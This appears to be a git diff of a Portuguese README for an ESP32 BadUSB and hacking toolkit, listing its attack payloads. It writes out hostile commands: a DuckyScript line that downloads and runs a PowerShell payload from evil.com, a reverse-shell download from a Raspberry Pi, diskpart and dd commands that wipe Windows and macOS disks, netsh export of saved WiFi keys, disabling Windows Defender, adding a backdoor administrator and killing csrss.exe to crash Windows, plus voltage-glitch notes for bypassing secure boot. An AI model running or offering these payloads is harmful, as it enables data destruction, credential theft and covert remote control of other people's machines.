@@ -95,6 +95,7 @@ Transforma o dispositivo em um teclado USB interativo para digitar em tempo real
 ### O que é Fault Injection?
 
 Técnica de ataque que introduz erros controlados em um chip para:
+
 - Bypass de Secure Boot
 - Extração de chaves criptográficas
 - Execução de código arbitrário
@@ -112,17 +113,20 @@ Técnica de ataque que introduz erros controlados em um chip para:
 ### Voltage Glitch em ESP32
 
 **Hardware necessário:**
+
 - ChipWhisperer ou similar
 - Osciloscópio
 - Fontes de 3.3V
 - Modificações na placa (cortar trilhas)
 
 **Pontos de ataque:**
+
 - VDD3P3_CPU
 - VDD_PST2 (ESP32-C6)
 - VDD3P3_RTC
 
 **Parâmetros críticos:**
+
 - Duração: 1-3 ciclos de clock
 - Timing: durante boot ROM
 - Tensão: variação de ~0.5V
@@ -183,3 +187,169 @@ DELAY 1000
 STRING IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
 ENTER
 ```
+
+---
+
+## 🔪 Advanced BadUSB Attacks (Novos)
+
+### Disk Wipe Windows
+
+Apaga completamente o disco C: do Windows.
+
+**Como funciona:**
+
+- Abre PowerShell como administrador
+- Executa `diskpart` para limpar disco 0
+- Destruição irreversível de dados
+
+**Comandos executados:**
+
+```powershell
+diskpart
+list disk
+select disk 0
+clean
+```
+
+### Disk Wipe Mac
+
+Brick total do macOS destruindo a partição de sistema.
+
+**Como funciona:**
+
+- Abre Terminal
+- Executa `dd if=/dev/zero of=/dev/rdisk0 bs=1024`
+- Sistema fica inutilizável
+
+### Reverse Shell to Raspberry Pi
+
+Estabelece shell reverso para servidor no Pi.
+
+**Como funciona:**
+
+- Baixa e executa script PowerShell
+- Conecta de volta ao Pi na porta 4444
+- Shell completo no Windows
+
+**Payload gerado:**
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('http://pi-ip/shell.ps1')
+```
+
+---
+
+## 🎯 Payloads Pré-Definidos
+
+### Reverse Shell
+
+Cria shell reverso TCP no alvo.
+
+**Parâmetros:**
+
+- IP: 192.168.1.100 (configurável)
+- Porta: 4444
+
+### WiFi Password Stealer
+
+Extrai senhas WiFi salvas.
+
+**Como funciona:**
+
+- Executa `netsh wlan export profile key=clear`
+- Salva em %TEMP% para coleta
+
+### Browser Credentials
+
+Tentativa de roubo de credenciais navegador.
+
+**Como funciona:**
+
+- Abre YouTube (placeholder)
+- Implementação real requer extensões
+
+### Disable Windows Defender
+
+Desativa proteção em tempo real.
+
+**Como funciona:**
+
+- PowerShell: `Set-MpPreference -DisableRealtimeMonitoring $true`
+- Requer privilégios administrativos
+
+### Download & Execute
+
+Baixa e executa arquivo remoto.
+
+**Como funciona:**
+
+- PowerShell download para %TEMP%
+- Execução automática
+
+### Add Admin User
+
+Cria usuário administrador backdoor.
+
+**Como funciona:**
+
+- `net user hacker P@ssw0rd /add`
+- `net localgroup administrators hacker /add`
+
+### Force BSOD
+
+Crash forçado do Windows.
+
+**Como funciona:**
+
+- Mata processo crítico csrss.exe
+- Windows entra em BSOD
+
+### Fake Update
+
+Abre página falsa de atualização.
+
+**Como funciona:**
+
+- Abre navegador em modo kiosk
+- Página hospedada externamente
+
+### Wallpaper Hack
+
+Muda wallpaper do sistema.
+
+**Como funciona:**
+
+- Baixa imagem para %TEMP%
+- Registra no Windows Registry
+
+### TTS Speak
+
+Fala texto via Windows TTS.
+
+**Como funciona:**
+
+- .NET Speech Synthesis
+- Fala mensagem configurada
+
+### Info to Notepad
+
+Coleta informações do sistema.
+
+**Como funciona:**
+
+- Get-ComputerInfo > arquivo
+- Abre no Bloco de Notas
+
+---
+
+## 🔧 USB Hardware Limitations
+
+| Funcionalidade | CYD-2USB | ESP32-S3 |
+|----------------|----------|----------|
+| USB HID | ❌ (BLE only) | ✅ Full |
+| BadUSB Direct | ❌ | ✅ Native |
+| High-Speed | ❌ | ✅ USB 2.0 |
+| OTG Support | ❌ | ✅ |
+| Fault Injection | ❌ | ❌ (external) |
+
+**Recomendação:** Para USB avançado, use ESP32-S3 com USB OTG.
